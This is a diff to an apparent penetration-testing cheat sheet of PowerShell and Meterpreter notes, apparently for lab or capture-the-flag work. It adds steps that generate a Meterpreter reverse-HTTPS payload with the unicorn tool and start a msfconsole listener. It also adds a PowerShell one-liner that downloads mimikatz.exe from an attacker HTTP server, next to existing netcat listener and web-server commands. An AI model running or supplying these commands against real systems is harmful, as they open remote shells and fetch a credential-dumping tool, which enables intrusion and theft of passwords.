@@ -1,3 +1,12 @@
+PowerShell downgrade attack or create powershell 
+=================================================
+https://github.com/trustedsec/unicorn
+
+python unicorn.py windows/meterpreter/reverse_https X.X.X.X 9005
+
+export powershell_attck.txt
+export unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener
+
 Meterpreter Powershell
 ======================
 
@@ -174,15 +183,15 @@ Other use PowerShell
 get-Content "XxxxxxX.lnk"
 
 
-1. List *.lnk
-===========
+1. List *.lnk  ( This link maybe run ( runas command)
+=====================================================
 
 $WScript = New-Object -ComObject WScript.Shell
 $shortcut = Get-ChildItem *.link
 $shortcut
 
 2. Details *.lnk
-==============
+===================
 
 $WScript.CreateShortcut($shortcut)
 
@@ -205,6 +214,10 @@ python -m SimpleHTTPServer
 
 nc -nvlp 9002
 
+1. On Powershell Download File
+============================
+
+(New-Object Net.WebClient).DownloadFile('http://10.10.14.3:8000/mimikatz.exe','mimikatz.exe')
 
 
 
